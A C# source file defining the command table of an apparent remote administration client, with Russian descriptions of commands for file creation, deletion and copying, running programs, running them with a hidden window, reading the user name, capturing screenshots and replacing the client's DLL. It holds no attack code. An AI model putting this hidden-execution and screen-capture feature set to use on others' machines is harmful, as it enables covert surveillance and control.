// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
namespace CommandsLibrary
{
    public class Arguments : IArgument
    {
        public string Command { get; set; }
        public int ArgumentCount { get; set; }
        public string[] ArgumentsList { get ; set; }
        public string ArgumentType { get; set; }
        public string CommandInfo { get; set; }

        public static IArgument[] arguments =
        {
            new Arguments()
            {
                Command = "/create",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Создает файл по указанному пути на системе"
            },
            new Arguments()
            {
                Command = "/createwrite",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл",
                    "Содержимое файла"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Создает файл по указанному пути на системе и записывает туда информацию"
            },
            new Arguments()
            {
                Command = "/delete",
                ArgumentCount =  1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Удаляет файл по указанному пути"
            },
            new Arguments()
            {
                Command = "/copy",
                ArgumentCount = 2,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл для копирования",
                    "Путь к файлу\\Файл для вставки"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Копирует файл из одного пути на системе в другой (поддерживается пересоздание)"
            },
            new Arguments()
            {
                Command = "/start",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Запускает исполняемый файл на системе по указанному пути"
            },
            new Arguments()
            {
                Command = "/startinvis",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Путь к файлу\\Файл"
                },
                ArgumentType = "TextBox",
                CommandInfo = "Запускает исполняемый файл на системе по указанному пути и пытается скрыть активное окно программы (не работает на всех программах)"
            },
            new Arguments()
            {
                Command = "/nameofpc",
                ArgumentCount = 0,
                ArgumentsList = null,
                CommandInfo = "Возвращает имя активного пользователя системы"
            },
            new Arguments()
            {
                Command = "/screen",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Открыть скриншот панель"
                },
                ArgumentType = "Button",
                CommandInfo = "Возвращает текущий снимок экрана на системе"
            },
            new Arguments()
            {
                Command = "/update",
                ArgumentCount = 1,
                ArgumentsList = new string[]
                {
                    "Загрузить файл"
                },
                ArgumentType = "Button",
                CommandInfo = "Загружает/Пересоздает в основную папку клиента загруженный вами файл (используется для обновления .dll)"
            }
        };
    }
}
